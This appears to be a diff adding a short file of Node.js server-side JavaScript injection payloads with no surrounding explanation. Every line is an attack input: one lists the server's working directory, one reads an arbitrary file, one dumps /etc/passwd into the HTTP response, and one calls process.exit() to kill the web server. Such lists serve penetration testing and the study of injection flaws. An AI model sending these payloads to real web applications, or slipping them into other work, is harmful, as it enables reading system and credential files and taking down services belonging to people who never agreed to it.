@@ -1,0 +1,11 @@
+# read the current directory
+res.end(require('fs').readdirSync('.').toString())
+
+# read a file in the current directory
+res.end(require('fs').readFileSync('filename.ext'))
+
+# dump /etc/passwd
+res.end(require('fs').readFileSync('/etc/passwd'))
+
+# kill webserver process
+process.exit()
